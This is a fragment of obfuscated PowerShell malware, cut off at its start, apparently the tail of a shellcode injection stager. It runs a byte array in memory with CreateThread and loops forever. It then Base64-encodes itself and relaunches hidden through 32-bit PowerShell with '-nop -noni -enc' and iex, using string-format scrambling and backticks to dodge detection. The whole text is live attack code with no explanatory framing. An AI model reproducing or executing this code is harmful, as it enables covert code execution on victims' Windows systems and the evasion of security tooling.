$sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';${g`q} =   ( &("{2}{0}{1}"-f'et-VA','rIabLe','G') ('9a'+'J7d') -vaLueoNly  )::"tOB`AsE64ST`R`INg"(  (&("{0}{1}{3}{2}" -f 'geT','-','le','vARiAb') 32fy )."vaL`UE"::"U`N`icODE".("{0}{1}{2}"-f 'GetB','yt','es').Invoke(${1}));if( ${F`IoR`W6}::"si`ZE" -eq 8){${x`86} = ${enV:SYs`Te`m`ROOt} + ((("{11}{2}{1}{9}{12}{8}{4}{0}{3}{6}{7}{10}{5}"-f '0Dp','640DpWin','ow','po','0','l','w','ersh','v1.','dows','el','0Dpsysw','PowerShell0Dp'))  -CREPlace([Char]48+[Char]68+[Char]112),[Char]92);${C`mD} = ("{0}{3}{2}{1}"-f '-nop ','ni -enc','no','-');&("{0}{1}"-f'i','ex') ('& '+"$x86 "+"$cmd "+"$gq")}else{${C`mD} = ("{1}{0}{2}" -f ' -','-nop -noni','enc');&("{1}{0}" -f'ex','i') ('& '+'p'+'owershe'+'ll '+"$cmd "+"$gq");}
